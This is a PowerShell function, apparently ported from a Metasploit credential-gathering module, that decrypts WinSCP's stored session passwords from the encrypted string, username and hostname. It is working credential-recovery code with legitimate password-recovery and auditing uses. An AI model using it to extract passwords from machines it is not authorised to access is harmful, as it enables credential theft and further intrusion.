#https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/winscp.rb
$PWALG_MAGIC = 0xA3
$PWALG_BASE = "0123456789ABCDEF"
$PWALG_MAXLEN = 50
$PWALG_FLAG = 0xFF

function dec_next_char
{
	if ($global:pwd.length -gt 0)
	{
		$a = $PWALG_BASE.indexof($global:pwd[0])
		$a = $a -shl 4
		$b = $PWALG_BASE.indexof($global:pwd[1])
		$result = -bnot (($a + $b) -bxor $PWALG_MAGIC) -band 0xff
		$global:pwd = $global:pwd.remove(0,2)
		return $result
	}
}

function decrypt-winscppassword
{
<#
.SYNOPSIS

.DESCRIPTION

.PARAMETER

.INPUTS
Nothing can be piped directly into this function

.EXAMPLE

.EXAMPLE

.OUTPUTS

.NOTES
NAME: 
AUTHOR: 
LASTEDIT: 
KEYWORDS:

.LINK

#>
[CMDLetBinding()]
param
(
	[Parameter(mandatory=$true)] [String] $password,
	[Parameter(mandatory=$true)] [String] $username,
	[Parameter(mandatory=$true)] [String] $hostname
)

$key = $username + $hostname
$global:pwd =$password
$flag = dec_next_char
$length = 0
$ldel = 0

Write-Verbose "flag $flag"
if ($flag -eq $PWALG_FLAG)
{
	dec_next_char | Out-Null
	$length = dec_next_char
} else {
	$length = $flag
}
Write-Verbose "Length $length"

$ldel = (dec_next_char) * 2
Write-Verbose "ldel $ldel"

$global:pwd = $global:pwd.substring($ldel)

$result = ""

for ($ss =0; $ss -lt $length; $ss++)
{
	$result = $result + [char] (dec_next_char)
}

Write-Verbose "Result pre trim $result"

if ($flag -eq $PWALG_FLAG)
{
	$result = $result.substring($key.length)
}

Write-Verbose "Result returned $result"

return $result

}
